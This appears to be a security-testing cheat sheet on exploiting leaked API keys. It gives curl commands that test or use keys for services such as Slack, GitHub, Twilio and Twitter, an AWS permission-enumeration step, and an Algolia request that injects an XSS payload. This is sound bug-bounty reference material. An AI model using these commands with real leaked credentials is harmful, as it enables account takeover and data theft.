# API Key Leaks

> The API key is a unique identifier that is used to authenticate requests associated with your project. Some developpers might hardcode them or leave it on public shares.

## Summary

- [Tools](#tools)
- [Exploit](#exploit)
    - [Algolia](#algolia)
    - [AWS Access Key ID & Secret](#aws-access-key-id-secret)
    - [Slack API Token](#slack-api-token)
    - [Facebook Access Token](#facebook-access-token)
    - [Github client id and client secret](#github-client-id-and-client-secret)
    - [Twilio Account_sid and Auth Token](#twilio-account_sid-and-auth-token)
    - [Twitter API Secret](#twitter-api-secret)
    - [Twitter Bearer Token](#twitter-bearer-token)
    - [Gitlab Personal Access Token](#gitlab-personnal-access-token)

## Tools

- [KeyFinder - is a tool that let you find keys while surfing the web!](https://github.com/momenbasel/KeyFinder)
- [Keyhacks - is a repository which shows quick ways in which API keys leaked by a bug bounty program can be checked to see if they're valid.](https://github.com/streaak/keyhacks)

## Exploit

The following commands can be used to takeover accounts or extract personnal informations from the API using the leaked token.

### Algolia 

```powershell
curl --request PUT \
  --url https://<application-id>-1.algolianet.com/1/indexes/<example-index>/settings \
  --header 'content-type: application/json' \
  --header 'x-algolia-api-key: <example-key>' \
  --header 'x-algolia-application-id: <example-application-id>' \
  --data '{"highlightPreTag": "<script>alert(1);</script>"}'
```

### AWS Access Key ID & Secret

```powershell
git clone https://github.com/andresriancho/enumerate-iam
cd enumerate-iam
./enumerate-iam.py --access-key AKIA... --secret-key XXX..
```

### Slack API Token

```powershell
curl -sX POST "https://slack.com/api/auth.test?token=xoxp-TOKEN_HERE&pretty=1"
```

### Facebook Access Token

```powershell
curl https://developers.facebook.com/tools/debug/accesstoken/?access_token=ACCESS_TOKEN_HERE&version=v3.2
```

### Github client id and client secret

```powershell
curl 'https://api.github.com/users/whatever?client_id=xxxx&client_secret=yyyy'
```

### Twilio Account_sid and Auth token

```powershell
curl -X GET 'https://api.twilio.com/2010-04-01/Accounts.json' -u ACCOUNT_SID:AUTH_TOKEN
```

### Twitter API Secret

```powershell
curl -u 'API key:API secret key' --data 'grant_type=client_credentials' 'https://api.twitter.com/oauth2/token'
```

### Twitter Bearer Token

```powershell
curl --request GET --url https://api.twitter.com/1.1/account_activity/all/subscriptions/count.json --header 'authorization: Bearer TOKEN'
```

### Gitlab Personal Access Token

```powershell
curl "https://gitlab.example.com/api/v4/projects?private_token=<your_access_token>"
```


## References

* [Finding Hidden API Keys & How to use them - Sumit Jain - August 24, 2019](https://medium.com/@sumitcfe/finding-hidden-api-keys-how-to-use-them-11b1e5d0f01d)
* [Private API key leakage due to lack of access control - yox - August 8, 2018](https://hackerone.com/reports/376060)